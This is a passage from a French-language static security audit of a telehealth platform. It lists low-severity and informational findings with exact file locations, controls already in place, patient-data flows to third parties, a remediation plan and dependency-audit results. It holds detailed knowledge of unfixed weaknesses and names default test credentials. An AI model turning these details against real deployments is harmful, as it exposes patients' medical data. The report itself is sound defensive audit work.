| F-08 | Parsing XML avec `xml.etree` sans `defusedxml` (expansion d'entités bornée par libexpat ≥ 2.4 et `DATA_UPLOAD_MAX_MEMORY_SIZE` 2,5 Mio ; XXE impossible ; après authentification) | `backend/caldav/views.py:324-332`, `backend/carddav/views.py:213-222` | `defusedxml.ElementTree.fromstring(forbid_dtd=True)`, limite de taille dédiée aux corps REPORT |
| F-09 | Création massive d'utilisateurs temporaires via les ressources `contained` d'un bundle FHIR ; N+1 sur les bundles (`_count` ≤ 100) | `backend/consultations/fhir_participants.py:49-51`, `consultations/fhir.py:506-533, 102-106, 186-192`, `users/fhir.py:130-140, 417-425` | Plafonner `contained`/participants ; `prefetch_related` |
| F-10 | `LinkifyPipe` : `bypassSecurityTrustHtml` après un échappement incomplet (`"` non échappé) : XSS stocké prêt à l'emploi si le pipe est branché sur le chat (aujourd'hui non utilisé) | `practitioner/src/app/shared/pipes/linkify.pipe.ts:9-26` | Supprimer le pipe ou le réécrire par construction DOM (`createElement`, `textContent`, validation `new URL()` et protocole `http(s):`) |
| F-11 | Clés E2E et caches mémoire non purgés au logout (praticien : IndexedDB `hcw-encryption`, `pemCache` ; patient : `storage.clear()` ne touche pas l'IndexedDB des clés) ; passphrase affichée en clair et pré-remplie | `practitioner/src/app/core/components/header/header.ts:386-406`, `consultation-crypto.service.ts:154-157`, `activate-encryption.html:29-31`, `onboarding.ts:271-276` ; `patient/.../auth.service.ts:202`, `profile.page.ts:282-292` | Purger IndexedDB et caches au logout (ou option « appareil personnel »), masquer la passphrase |
| F-12 | Jeton d'invitation `?auth=` conservé dans l'historique (pas de `replaceUrl`), non consommé ; remplacement de session sans révocation du refresh précédent | `practitioner/src/app/app.ts:117-125`, `verify-invite.ts:77` ; `patient/src/app/app.component.ts:161-221`, `verify-invite.page.ts:76-127`, `auth.service.ts:133-141` | `replaceUrl` + `history.replaceState` dès lecture, fragment `#auth=`, `logout()` avant `storeTokens` |
| F-13 | Dockerfile praticien : `yarn install` sans `--frozen-lockfile`, `COPY . .` sans `.dockerignore`, génération d'une clé RSA factice jamais utilisée | `practitioner/Dockerfile:6-11` | `--frozen-lockfile`, `.dockerignore`, retirer OpenSSL |
| F-14 | Schéma `hcw://` non vérifié (toute app peut l'intercepter : faux écran de connexion) ; projet iOS incomplet (pas de `CFBundleURLTypes`, pas de `NSCameraUsageDescription`/`NSMicrophoneUsageDescription`, pas d'entitlements) ; permissions caméra/micro non déclarées côté Android (à confirmer sur appareil) | `patient/android/app/src/main/AndroidManifest.xml:22-27, 36`, `patient/ios/App/App/Info.plist` | App Links (`assetlinks.json`, `autoVerify`) et Universal Links ; compléter le projet iOS avant publication |
| F-15 | Sélecteur d'instance et `hcw_api_origin` actifs aussi dans le build web : une valeur `localStorage` redirige toutes les requêtes authentifiées vers un autre hôte (amplifie une XSS) | `patient/src/app/app.routes.ts:27-39`, `deeplink.service.ts:62-64, 136-148`, `api.service.ts:22-25`, `auth.interceptor.ts:31-34` | N'activer le mécanisme que si `Capacitor.isNativePlatform()` |
| F-16 | Brouillon de demande (spécialité, praticien, motif, commentaire libre) sérialisé en clair dans `sessionStorage` | `patient/src/app/pages/new-request/new-request.page.ts:520-531`, `pending-action.service.ts:31-41` | Conserver en mémoire, purger à la fermeture |
| F-17 | Swagger `/api/docs/` et `/api/schema/` publics avec `persistAuthorization` (JWT saisi conservé en `localStorage`) | `backend/api/urls.py:21-23`, `settings.py:427` | `SERVE_PERMISSIONS: IsAdminUser` ou désactivation en production ; `persistAuthorization: False` |
| F-18 | CORS : `http://localhost` et `https://localhost` autorisés avec credentials en production (nécessaire à Capacitor, mais toute page servie sur le port 80/443 du poste peut appeler l'API) ; reflet total en `DEBUG` | `backend/core/settings.py:1391-1399` | Limiter aux origines natives strictement nécessaires ; ne jamais coupler `ALLOW_ALL` et credentials |
| F-19 | Divulgation de versions (`Server: daphne`, `server_tokens` nginx) ; `S3_VERIFY=false` documenté sans mention « dev only » (MITM sur pièces jointes) | `docs/deployment/environment-variables.md:99`, `settings.py:1604`, `bootstrap_tenant.py:456` | `server_tokens off`, masquage par le proxy ; CA interne plutôt que désactivation TLS |
| F-20 | Fixtures de test avec superuser `admin@example.com` et mot de passe commun `Test1234`, documentées dans les guides de production | `backend/initial/TestData.json:16-31`, `docs/deployment/docker-compose.md:115`, `debian.md:112-119` | Retirer l'étape des guides de production ; refuser `loaddata` de ce fichier quand `DEBUG=False` |
| F-21 | Actions admin irréversibles sans page de confirmation (`reset_encryption` supprime les enveloppes de file) ; envois de notifications de test à des appareils réels | `backend/consultations/admin.py:132-188`, `users/admin.py:336-346, 428-557` | Confirmation intermédiaire, restriction superuser |
| F-22 | Certification d'instance : instances connues jamais re-validées (signature expirée ou révoquée reste sélectionnable), clé publique Iabsis en dur sans `kid` ni révocation | `patient/src/app/core/services/deeplink.service.ts:97-103, 188-236`, `iabsis-keys.ts:5-6`, `backend/core/instance_signature.py` | Re-valider `/api/identity/` à chaque activation, supporter plusieurs clés |

---

## 7. Observations (Info)

| ID | Observation | Localisation |
|---|---|---|
| I-01 | `ALLOWED_HOSTS = [None, …]` quand `ALLOWED_HOST` est absent (inoffensif) ; le compose ne transmet que `ALLOWED_HOSTS` (défaut `*`) alors que son commentaire d'en-tête recommande `ALLOWED_HOST` ; django-tenants renvoie 404 pour tout domaine non enregistré sauf `/api/health/` | `backend/core/settings.py:58-60`, `docker-compose.yml:10, 29` |
| I-02 | `MAINTENANCE_MESSAGE` (variable d'environnement) inséré dans le HTML sans échappement | `backend/core/middleware.py:26, 48` |
| I-03 | Code mort ou résiduel : `ENCRYPTION_KEY` lue mais inutilisée (valeur commitée dans `.env-dist:35` et `tests.yml:65`), `core/fields.py` (`EncryptedField` cassé), `generate_magic_token`/`verify_magic_token` (`users/views.py:541-548`), champ `User.encrypted` (`users/models.py:194`, à confirmer), `django-tinymce` en dépendance sans usage, `CustomConstanceAdmin` écrasé par `HiddenKeysConstanceAdmin` (`users/admin.py:91-129`, `encryption_admin/admin.py:131-134`) | — |
| I-04 | `REST_FRAMEWORK` sans `DEFAULT_PERMISSION_CLASSES` : toute vue sans `permission_classes` explicite est `AllowAny` (aucun cas accidentel trouvé, mais risque futur) | `backend/core/settings.py:291-318` |
| I-05 | `POST/PATCH /api/participants/` et `POST /api/messages/` finissent en 500 (`ParticipantDetailSerializer` sans `create`/`update`, `consultation` read-only) : ces écritures ne sont bloquées que « par accident », à confirmer par test | `backend/consultations/views.py:1333-1364`, `serializers.py:1709-1714` |
| I-06 | Signature d'instance : Ed25519 sur `host\nexp`, vérifiée côté app avec une clé embarquée. Elle ne protège aucune donnée : c'est un contrôle de distribution (l'app native n'ouvre que des instances certifiées) et un garde-fou anti-phishing par deep link. Un opérateur ne peut pas la contrefaire pour l'app native ; il peut seulement tromper la bannière de l'app web en surchargeant `IABSIS_PUBLIC_KEY_B64`. Pas de révocation (expiration seule, 365 j). Implémentation correcte. Aucun appel sortant vers Iabsis. | `backend/core/instance_signature.py`, `users/management/commands/hcw_sign.py`, `patient/.../deeplink.service.ts:188-252` |
| I-07 | Aucune couverture de test sur : chiffrement et signature (aucun `test*` ne mentionne `encrypt`, `passphrase`, `ConsultationKey`), `DELETE /api/users/`, `PractitionerViewSet` update/delete, `regenerate-encryption-key`, `recording_url`/`download_recording`, suppression de rendez-vous par un confrère, rejeu de token inter-tenant, throttling, CSRF/CORS, webhook Twilio, redirecteur ; `dav/` et `carddav/` sans tests | `backend/**/tests*.py` |
| I-08 | Écarts documentation/code : MFA promise (`README.md:40, 90`, `docs/index.fr.md:27`) mais désactivée ; `ACCESS_TOKEN_LIFETIME` présenté comme `60` dans `.env-dist:99` (réel : 3600 min) ; `TEMPORARY_USER_AUTO_DELETE` documenté `FALSE` (réel `True`), auto-close documenté `0` (réel `60`), nom `TEMPORARY_USER_DELETE_HOURS` vs `consultation_auto_delete_hours` (`docs/admin/advanced-options.md:16-22`) ; « application logs » promis sur le tableau de bord (`docs/admin/organizations.md:20`) ; commentaires du compose décrivant une configuration LiveKit absente ; `encryption.md` : « no backdoor », « generated in the practitioner's browser », « Resync key banner », outil de recouvrement master : inexacts (E-18, E-19, M-18) | — |
| I-09 | FHIR/DAV : `_revinclude` collecté mais jamais appliqué (`fhir_server/search.py:342-344`) ; `PUT Appointment` sans `supportingInformation` détache la consultation (`consultations/fhir.py:335`) ; CalDAV ignore `If-Match`/`If-None-Match` (écrasements), `PUT` sur un href inconnu crée un rendez-vous au lieu de 403/404, `getctag = now` force une resynchronisation totale à chaque requête ; les lignes `ATTENDEE` livrent nom et email de tous les participants à chaque participant, CardDAV exporte BDAY/ADR/TEL des patients vers Google/Apple | `backend/caldav/views.py:85-95, 279-281, 397-455`, `carddav/views.py:42-59, 170-172` |
| I-10 | En mode E2E, `new_message_notification` embarque `obj.content` (blob JSON chiffré) dans les SMS/emails ; l'export PDF exporte le ciphertext ; titres, descriptions, `notes`, participants, horodatages restent en clair | `backend/messaging/template.py:106-121`, `consultations/pdf_export.py:477`, `consultations/models.py:159-170, 487-525` |
| I-11 | Artefacts inutilisés : FCM `send_user_notification` sans appelant hors action admin (`users/models.py:393-407`) ; plugin natif `hcw-vault` référencé dans `capacitor.plugins.json` mais absent de `package.json` ; `FileProvider` Android déclaré sans usage ; `Message.access_link` est une propriété qui écrit en base (`messaging/models.py:889-894`) | — |
| I-12 | Chiffrement au repos des pièces jointes en cours d'écriture (non commité) : `core/blobcrypto.py` est sain en première lecture (clé par fichier HKDF-SHA256 avec sel aléatoire, AES-256-GCM par bloc de 64 Kio avec index et sel en données authentifiées, en-tête authentifié incluant la taille, `key_id` dérivé, refus d'une clé < 32 caractères ou égale à `SECRET_KEY`, rotation par `BLOB_ENCRYPTION_OLD_KEY`). Réserves : `download_recording` lit S3 directement avec boto3, hors du storage chiffré (E-07) ; l'entropie de `BLOB_ENCRYPTION_KEY` n'est pas validée (seulement la longueur) ; la sentinelle n'est vérifiée que par `check --database` ; la commande `encrypt_blobs` référencée n'existait pas encore. À auditer une fois stabilisé. | `backend/core/blobcrypto.py`, `core/storage.py`, `core/checks.py`, `core/settings.py:1668-1700` |

---

## 8. Contrôles en place (points positifs)

Ces éléments ont été vérifiés dans le code et doivent être préservés lors des corrections.

**Authentification et sessions**
- `TenantJWTAuthentication` par défaut : claims `tenant_id`/`tenant_schema` injectées à l'émission et vérifiées à chaque requête (`core/authentication.py:24-69`) ; même contrôle sur les WebSockets (`channelsmiddleware.py:99-123`) avec résolution du tenant en `schema_context(public)`. `TokenAuthentication`, sessions allauth et admin isolés par schéma (`TENANT_APPS`).
- Codes de vérification : `secrets.randbelow`, 6 chiffres, TTL 15 min, 3 essais puis code brûlé, `select_for_update`, `compare_digest`, réponses uniformes (`users/verification.py`, `users/views.py:1864-1986`), tests dédiés. Anti-énumération sur `RegisterView`, `VerificationResendView`, `SendVerificationCodeView` et sur le reset dj-rest-auth.
- Inscription désactivée par défaut, praticiens exclus des flux par code, `is_practitioner` en lecture seule dans l'API, `AccountVerifyView` ne réactive pas un compte désactivé ayant un `last_login`, `UserDetailsSerializer.update` remet `email_verified=False`.
- Identifiants normalisés : contrainte unique insensible à la casse sur l'email, E.164 pour les téléphones, throttle par identifiant canonisé. Throttles déclarés sur tous les endpoints sensibles, doubles limites IP + identifiant. `LoginSelectorView` réservé au staff, message d'erreur générique, CSRF présent.
- OIDC côté SPA : `state` aléatoire 32 octets en `sessionStorage`, vérifié et consommé dans le callback ; URLs issues de `/api/config/`. `UserViewSet.update` protège staff, superusers et praticiens (sur cette route).
- Jetons DAV et `one_time_auth_token` à forte entropie ; DAV n'accepte jamais le mot de passe de compte ni la session cookie (`csrf_exempt` sans CSRF exploitable). Nettoyage automatique des utilisateurs temporaires.

**Autorisation**
- `IsPractitioner` sur tous les ViewSets praticiens ; les patients n'atteignent que `/api/user/*`, `/api/requests/`, `/api/messages/<id>/`, `/api/queues/` et les référentiels, avec des querysets correctement bornés (`users/views.py:556-603, 1015-1023, 2100-2193`).
- Règle d'accès centralisée `consultation_access_q` / `roster_access_q` / `accessible_by` (`consultations/utils.py:108-186`, `managers.py:19-40`), appliquée par `MessageViewSet`, `MessageAttachmentView`, les serializers imbriqués (masquage de `consultation_id`, titre, suppression de `notes` pour les non-praticiens). `check_consultation_authority` sur les références de consultation ; `join` exige le roster ; recording/mute gardés par `_is_doctor`/`_can_moderate_call`.
- Opérations conditionnelles FHIR résolues **dans** `filter_queryset(get_queryset())` : 0 → 404, > 1 → 412, pas de mise à jour ou suppression multiple. Recherche FHIR limitée aux paramètres déclarés par le mapper, aucun lookup `__` injectable, `_count` plafonné. `parse_reference` ne fait que du découpage de chaîne (pas de SSRF). Filtres django-filter sans traversée élargissante.
- `encrypted_private_key` exposé au seul propriétaire ; enveloppes de consultation et de queue filtrées par utilisateur ; `sync_consultation_keys` valide les destinataires ; messages : édition et suppression réservées à l'auteur ; notifications, webpush, DAV passwords, booking slots scopés à `request.user`.

**Temps réel et multi-tenant**
- Groupes Channels préfixés par schéma (`core/channel_groups.py`) : pas de collision Redis inter-tenant. Consumer de consultation refuse (4003) hors `consultation_access_q` ; consumer de transcription exige un roster actif. Pas de `connection.set_tenant` dans le code async ; accès DB et cache encapsulés dans `tenant_scope()`. `from_user_id`/`caller_id` fixés côté serveur ; `broadcast` réservé au staff ; pas de `join_group` arbitraire.
- Identités LiveKit et MediaSoup préfixées par le schéma, rooms en UUID4, grants minimaux (pas de `roomCreate`/`roomList`/`roomRecord`), patients jamais admin, `join` conditionné au roster, au statut et à la fenêtre horaire, credentials S3 jamais envoyés au navigateur. Cache `default` préfixé par schéma (`django_tenants.cache.make_key`) ; Celery tenant-aware (tâches planifiées itérant sur les tenants sous `tenant_context`, `schema_name` explicite dans les signaux).

**Fichiers et médias**
- Pièces jointes jamais exposées par URL : `debug_media_serve` les bloque même en `DEBUG`, `MessageAttachmentView` vérifie l'accès à la consultation. Noms de fichiers assainis par Django (pas de traversée de répertoire). S3 : URLs signées 1 h, ACL privée, configuration partielle refusée au démarrage. ReportLab 5.0.1 refuse les URL distantes. Vue admin de téléchargement en `attachment` avec `has_view_permission` (arbre de travail). Chiffrement au repos en cours (I-12).

**Messagerie**
- Webhook Twilio : `require_POST`, HMAC-SHA1 recalculé sur `backend_base_url` (immunisé contre la réécriture d'`Host`), `hmac.compare_digest`, statuts monotones, idempotence. Aucun lien envoyé n'est construit depuis l'en-tête `Host` (Constance) ; pas de redirection ouverte. Emails : sujet et destinataires via `EmailMultiAlternatives` (`BadHeaderError` sur CRLF), `From` depuis la config, `autoescape` sur `template_content_html`. WhatsApp : templates approuvés uniquement, `matches_phone_prefix` appliqué. Web Push : charge chiffrée bout en bout, désabonnement sur 404/410. Fan-out des notifications respectant `visible_by_patient`. Passphrases E2E via `EphemeralMessage` jamais persistées ni journalisées. Celery : sérialiseur JSON, tâches n'acceptant que des ids, résultats sans donnée personnelle.

**Cryptographie**
- RSA-OAEP-SHA256, AES-256-GCM avec IV aléatoire 12 octets par opération, CEK frais par enveloppe, PBKDF2-SHA256 600 000 itérations, sel 16 octets ; aléa via `secrets` et `crypto.getRandomValues` ; clés privées importées non extractibles ; passphrase jamais envoyée au serveur ; le serveur refuse la création d'une consultation en clair quand le chiffrement est activé ; vérification fonctionnelle de la paire master à l'import et comparaison d'empreintes master avant enveloppement dans l'admin ; signature d'instance correctement implémentée.

**Frontends**
- Échappement Angular par défaut ; aucun `eval`, `new Function`, `document.write`, `srcdoc`, `<iframe>`, listener `postMessage` ; un seul `bypassSecurityTrustHtml` (pipe inutilisé, F-10). Intercepteur praticien n'ajoutant `Authorization` que vers `environment.apiUrl` ; refresh single-flight ; purge et redirection sur 401. Pas de redirection ouverte (deep links mappés sur des routes internes). Builds de production sans source maps, `outputHashing`, `analytics: false`, `index.html` et `/api` en `no-store`, images nginx non privilégiées. Aucun secret, keystore ni fichier Firebase versionné (dépôt et historique de 1613 commits vérifiés). Messages de chat rendus en texte, pièces jointes en `blob:` authentifié.

**Déploiement**
- Secrets lus depuis l'environnement, `backend/.env` ignoré par git. Conteneur backend non root (uid 1000, `/app` en lecture seule) ; `api`, `db`, `redis` non publiés sur l'hôte ; healthchecks ; `migrate` séparé ; Celery beat en base. Daphne Debian sur `127.0.0.1`, utilisateur système `hcw`. Défauts Django sains conservés (`nosniff`, `X-Frame-Options: DENY`, COOP, `Referrer-Policy`, `SessionMiddleware` HttpOnly, CSRF middleware, `CORS_ALLOW_ALL_ORIGINS` limité à `DEBUG`, `SERVE_INCLUDE_SCHEMA=False`, traceback API seulement en `DEBUG`). CI : `yarn install --frozen-lockfile`, base de tests PostgreSQL réelle.

---

## 9. Flux de données personnelles vers des tiers

| Destinataire | Données transmises | Déclencheur | Référence |
|---|---|---|---|
| Twilio SMS (États-Unis) | numéro, corps SMS complet : date de RDV, code OTP, lien `?auth=<token>`, titre/description de rappel, **contenu des messages de consultation**, passphrase E2E | création de `messaging.Message` | `messaging/providers/twilio_sms.py:54-73`, `messaging/template.py` |
| Twilio WhatsApp (Meta) | numéro, variables de template (mêmes contenus), URL de callback ; corps des templates à la validation | envoi, validation de templates | `messaging/providers/twilio_whatsapp.py:126-235, 330-370` |
| OVH, Swisscom, Clickatell, SMSMode | numéro + corps SMS (idem) | envoi SMS | `messaging/providers/{ovh,swisscom,clickatel,smsmode}.py` |
| Serveur SMTP configuré | email, sujet, corps texte/HTML, pièce ICS, logo | envoi email | `messaging/providers/email.py:64-150` |
| Services Web Push (Google, Mozilla, Apple) | charge chiffrée bout en bout (illisible par le service) | notification push | `messaging/providers/webpush.py:36-62` |
| Firebase FCM | tokens d'appareil ; envoi de notification sans appelant hors action admin | enregistrement d'appareil | `users/models.py:122, 393-407` |
| Nominatim public (OSMF) | rue, code postal, ville, pays de **tout utilisateur, patients inclus**, et des organisations ; User-Agent | sauvegarde d'une adresse, commande `geocode` | `users/signals.py:10-34`, `users/tasks.py:140-151` |
| Tuiles OpenStreetMap | requêtes de tuiles depuis le navigateur admin (origine, zone consultée) | widget carte admin | `users/admin.py:146, 614` |
| LiveKit (auto-hébergé ou cloud) | flux audio/vidéo, identité de salle, **identifiants S3 d'egress** | appels, enregistrement | `mediaserver/manager/livekit.py:55-288` |
| whisper-live | audio brut de la consultation, langue, libellé du locuteur (en `ws://` par défaut) | transcription | `consultations/consumers.py:200-237` |
| S3 / MinIO | pièces jointes, logos, enregistrements mp4/ogg | upload, egress | `core/settings.py:1599-1662` |
| data.gouv.fr | aucune donnée envoyée (téléchargement de l'annuaire RPPS) | `import_rpps` | `users/management/commands/import_rpps.py:23-27` |
| Iabsis (hcw-at-home.com) | **aucun appel sortant** ; signature vérifiée localement | — | `core/instance_signature.py` |

Points d'attention réglementaires (RGPD, LPD suisse, hébergement de données de santé) : transferts hors UE/CH (Twilio, Meta) de contenus médicaux et de secrets d'authentification sans cadrage documenté ; Nominatim public sans DPA ; absence de piste d'audit (E-24) ; effacement non effectif (E-25) ; consentements non probants (M-32) ; enregistrement à l'insu (E-17) ; statut « patient » révélé par l'API (M-12).

---

## 10. Plan de remédiation priorisé

### P0 — Immédiat (avant toute mise en production ou dans les 7 jours sur une instance existante)
1. **C-01** : retirer les sept surcharges `authentication_classes = [JWTAuthentication]` ; test cross-tenant.
2. **C-02** : gardes sur `PractitionerViewSet`, `PatientViewSet`, routes FHIR ; interdire DELETE physique d'un utilisateur ; `email`/`mobile_phone_number` non modifiables par un tiers ; refuser `POST /api/fhir/Practitioner`.
3. **C-03** : `livekit.yaml` réel avec clés fortes, sans `--dev` ; refus de `devkey` au bootstrap.
4. **C-04** : `IMPORT_EXPORT_*_PERMISSION_CODE`, `UserResource` restreinte, import réservé aux superusers, `ESCAPE_FORMULAE_ON_EXPORT`.
5. **C-05** : suppression des défauts `changeme`/`admin`/`hcw`/`*` dans le compose ; check système refusant les valeurs factices ; `check --deploy`.
6. **E-01** : proxies de confiance pour `X-Forwarded-For` (nginx `real_ip` + `proxy_set_header` écrasant) ; retirer l'IP de la clé par identifiant ; verrouillage par compte.
7. **E-02** : `VERIFIED_EMAIL: False`, `AUTO_CONNECT: False`, `LOGIN_ON_GET: False`, promotion praticien sur claim explicite uniquement.
8. **E-11** : `ImmutableSandboxedEnvironment` et contexte restreint pour les templates.
9. **E-07** : `recording_url` en lecture seule, `download_recording` via `AppointmentRecording`.
10. **E-03 / E-04** : access token 15-60 min, `token_blacklist` + `BLACKLIST_AFTER_ROTATION`, blacklist au logout et aux changements de mot de passe, `OLD_PASSWORD_FIELD_ENABLED`, `LOGOUT_ON_PASSWORD_CHANGE`, cookies JWT `Secure`/`HttpOnly` ou supprimés, jeton WS hors query string.
11. **E-08 / E-09 / E-10** : `regenerate-encryption-key` réservé aux superusers ; `is_superuser` vérifié dans chaque vue `encryption_admin` ; champs de privilège en lecture seule pour les non-superusers ; OTP et tokens retirés de l'admin.
12. **E-23** : paquet Debian livré sans secrets et `DEBUG=False`.

### P1 — Sous 30 jours
- **E-05** : retrait de `allauth.urls`/`django.contrib.auth.urls`, throttle sur `admin:login`, MFA pour le staff.
- **E-06 / E-13 / E-14 / M-16 / M-17** : scoping de visibilité sur `PatientViewSet`, `access_url`, `expected_with_id`, `participants_ids`, `recipient_id` ; `destroy`/`send`/`leave` dans `WRITE_ACTIONS` ; CalDAV PUT/DELETE limités au créateur ; périmètre d'écriture des consultations réduit.
- **E-12 / M-29 / M-31** : suppression de `mark_safe`, assainissement HTML côté serveur, admin réservé aux objets de configuration, éditeur de traductions réservé aux superusers.
- **E-15 / E-16 / M-21** : ClamAV effectivement appelé et fail-close, liste blanche de types, `file_overwrite: False` et noms UUID, échappement ReportLab, limites de taille cohérentes.
- **E-20 / E-21 / E-22 / M-36** : suppression des `dataGroups` API et purge des caches au logout ; purge de session avant changement d'instance et jetons liés à l'origine ; suppression de `allowNavigation`/`cleartext`, `allowBackup=false`, stockage sécurisé natif.
- **E-27 / M-10 / M-08** : quotas SMS par tenant et destinataire, préfixes appliqués à tous les canaux, jeton magique à usage unique et haché, vérification du nouvel identifiant avant liaison.
- **M-22 / M-11** : en-têtes de sécurité et CSP sur tous les nginx, `X-Forwarded-Proto/For`, `SESSION_COOKIE_SECURE`, `CSRF_COOKIE_SECURE`, HSTS.
- **M-05 / M-06 / M-33** : chiffrement des secrets de prestataires, suppression des corps de réponse en `task_logs`, purge planifiée, validation des URLs Constance.

### P2 — Sous 90 jours
- **E-24** : piste d'audit applicative (accès aux dossiers, authentification, actions admin sensibles) exportée vers un collecteur.
- **E-25 / M-32 / E-17** : suppression effective des fichiers et objets S3, procédure d'effacement/anonymisation, endpoints RGPD, CGU versionnées avec acceptation horodatée, consentement et signalement de l'enregistrement/transcription.
- **E-18 / E-19 / M-18** : refonte du provisioning E2E (génération des paires dans le navigateur, passphrase jamais transmise par un tiers, changement forcé), affichage et comparaison d'empreintes, interdiction du downgrade, rotation des clés au retrait d'un participant, resync réel, documentation honnête du modèle.
- **E-26 / M-07 / M-20** : géocodage limité aux praticiens et organisations, notifications sans contenu médical, whisper en `wss://` avec clé obligatoire, DPA et registre des transferts.
- **M-19 / M-13 / M-14** : TTL LiveKit 10 min sans `roomAdmin`, identité IAM dédiée à l'egress, TURN éphémère ; DAV passwords hachés, expirants et refusés pour les comptes désactivés ; tokens d'intégration expirants et scopés.
- **M-24 / M-25 / M-27 / M-28** : Redis authentifié, `.dockerignore`, images épinglées, pip avec hashes, scanners en CI (`pip-audit`, `yarn audit`, `bandit`, `trivy`), `check --deploy`, Dependabot, durcissement systemd.

### P3 — Amélioration continue
- Constats Faible et Info ; tests de non-régression pour chaque correction (I-07) ; revue de la documentation (I-08) ; audit du chiffrement au repos une fois commité (I-12) ; test d'intrusion dynamique après corrections P0/P1.

---

## 11. Annexes

### A. Résultats des audits de dépendances

| Outil | Cible | Résultat |
|---|---|---|
| `pip-audit 2.10.1` (PyPI et OSV) | `backend/requirements.txt` (144 paquets épinglés, `--no-deps`) | aucune vulnérabilité connue |
| `yarn audit --groups dependencies` | `practitioner/yarn.lock` (60 paquets) | 0 vulnérabilité |
| `yarn audit --groups dependencies` | `patient/yarn.lock` (118 paquets) | 0 vulnérabilité |
| `yarn audit` (devDependencies) | `practitioner/` | 2 high (`js-yaml` via `eslint`), 9 moderate (`hono`, `qs` via `@angular/cli`, `karma`) : outillage de build et test uniquement, absent du bundle livré |

Versions clés relues manuellement sans CVE non corrigée connue : Django 6.0.8, DRF 3.18.0, simplejwt 5.5.1, dj-rest-auth 7.2.0, allauth 65.19.1, cryptography 50.0.0, pillow 12.3.0, requests 2.34.2, urllib3 2.7.0, twisted 26.4.0, daphne 4.2.3, channels 4.3.2, redis 8.1.0, celery 5.6.3, reportlab 5.0.1, pyjwt 2.13.0, django-unfold 0.104.1, django-import-export 4.4.1, django-storages 1.14.6, livekit-api 1.2.0, fhir-resources 8.3.0, pydantic 2.13.4, Angular 20.3.29, Capacitor 7.6.8, livekit-client 2.22.0. Constat structurel : pas de hashes pip, `requirements.in` non figé, images `latest`, aucun audit automatisé en CI (M-27).

### B. Couverture des endpoints REST (résumé)

| Route | Auth / permission | Scoping du queryset | Remarques |
|---|---|---|---|
| `/api/users/` | `IsAuthenticated, IsPractitioner` | `users_visibility` / `patient_visibility` | gardes sur `update`/`partial_update`, **aucune sur `destroy`** (C-02) ; « merge » de `temporary` hors périmètre (M-16) |
| `/api/patients/`, `/api/practitioners/` (+ FHIR `Patient`/`Practitioner`) | `IsAuthenticated, IsPractitioner` | **tous** les actifs | aucune garde (C-02, E-06) |
| `/api/practitioners/<pk>/public/`, `/api/map/`, `/api/specialities/*`, `/api/reasons/*` | `AllowAny` si `public_organisations` | — | PII exposées (M-15) |
| `/api/organisations/`, `/api/terms/`, `/api/languages/`, `/api/custom-fields/` | `IsAuthenticated` | tout | référentiels |
| `/api/users/<id>/regenerate-encryption-key/` | staff **ou praticien** | n'importe quel utilisateur | E-08 |
| `/api/auth/encryption/*` | `IsAuthenticated` | self | `forgot-passphrase` sans ré-authentification (M-17) |
| `/api/auth/user/` | `IsAuthenticated` | self | `email`, `mobile_phone_number`, `last_login`, `temporary` modifiables (M-08) |
| `/api/auth/openid/` | `AllowAny` | — | force `is_practitioner=True` (E-02) |
| `/api/auth/*` (login, logout, reset, refresh, registration, verify) | `AllowAny`, throttlés | — | throttles contournables (E-01) |
| `/api/user/notifications/*`, `/api/user/webpush/*`, `/api/user/testrtc/`, `/api/user/dashboard/`, `/api/user/consultations/`, `/api/user/appointments/`, `/api/messages/<id>/attachment/` | `IsAuthenticated` | self / roster | **`JWTAuthentication` brut** sur 7 vues (C-01) |
| `/api/user/participants/`, `/api/user/bookingslots/`, `/api/user/dav-passwords/` | `IsAuthenticated` (+ `IsPractitioner` pour les slots) | self | patients peuvent créer des DAV passwords (M-13) |
| `/api/consultations/` + actions | `IsAuthenticated, IsPractitioner` | `accessible_by` / `consultation_access_q` | invités « visibles » dans le périmètre d'écriture (M-17) ; DELETE = clôture |
| `/api/appointments/` + actions | `IsAuthenticated, IsPractitioner` | roster / créateur / accessible ; **lecture élargie pour `destroy`, `send`, `leave`** | E-14 ; `participants_ids` = tout `User` (M-16) |
| `/api/participants/` | `IsAuthenticated, IsPractitioner` | RDV accessibles | écriture non fonctionnelle (I-05) |
| `/api/queues/` | `IsAuthenticated` (patients inclus) | membre / org / queue sans org | membres avec email/téléphone (M-15) |
| `/api/requests/` | `IsAuthenticated` | `created_by=self` | `expected_with_id` = tout utilisateur (E-13) |
| `/api/messages/<id>/` + `download_recording` | `IsAuthenticated` | `consultation_access_q` | `recording_url` modifiable (E-07) |
| `/api/reminders/` | `IsAuthenticated, IsPractitioner` | `created_by=self` | `recipient_id` = tout utilisateur (M-16) |
| `/api/dashboard/` | `IsAuthenticated, IsPractitioner` | `accessible_by` | OK |
| `/api/fhir/metadata`, `/api/metadata/`, `/api/config/`, `/api/identity/`, `/api/translations/*`, `/api/schema/`, `/api/docs/` | public | — | pas de PII (Swagger : F-17) |
| `/dav/*` | Basic (app password) | roster / visibilité | PUT/DELETE par tout participant (E-14), comptes désactivés acceptés (M-13) |
| `/r/<token>`, `/messaging/twilio/status/<token>` | public / HMAC Twilio | — | redirecteur sans expiration (F-03) |
| `/`, `/<lang>/admin/`, `/accounts/*`, `/password_reset/`… | session Django | — | admin natif non throttlé, signup allauth ouvert (E-05) |

### C. Fichiers modifiés dans l'arbre de travail pendant l'audit (non commités)

`backend/.env-dist`, `backend/consultations/apps.py`, `backend/consultations/pdf_export.py`, `backend/consultations/admin.py`, `backend/core/settings.py`, `backend/core/storage.py`, `backend/core/urls.py`, `backend/users/management/commands/geocode.py`, `backend/users/tasks.py`, `backend/users/views.py`, `docs/docs/admin/advanced-options.md`, `docs/docs/deployment/environment-variables*.md`, nouveaux : `backend/core/blobcrypto.py`, `backend/core/checks.py`, `backend/users/tests_geocode_provider.py`. Les constats portent sur l'état lu ; ces chantiers (fournisseur de géocodage, chiffrement au repos, vue admin des pièces jointes) devront être ré-audités une fois commités.

### D. Limites de l'audit

- Revue statique uniquement : aucune requête exécutée, aucun service démarré, aucun APK/IPA construit. Les scénarios d'exploitation sont déduits du code ; les points marqués « à confirmer » nécessitent un test en conditions réelles (instance multi-tenant, IdP de production, proxy amont et sa gestion de `X-Forwarded-For`, sauvegardes Android, comportement de LiveKit `--dev`, contenu des réponses Twilio).
- Non couverts : reverse proxy TLS externe (Traefik/Caddy/nginx hôte), politiques de bucket S3, serveurs MediaSoup et whisper-live eux-mêmes, `doc.pptx`, devDependencies des frontends, permissions effectives des groupes réels en production, contenu de `backend/.env`.
- Les fichiers volumineux des frontends (`home.page.ts`, `video-consultation.page.ts`, `new-request.page.ts`, `map.page.ts`) ont été parcourus par recherche ciblée.
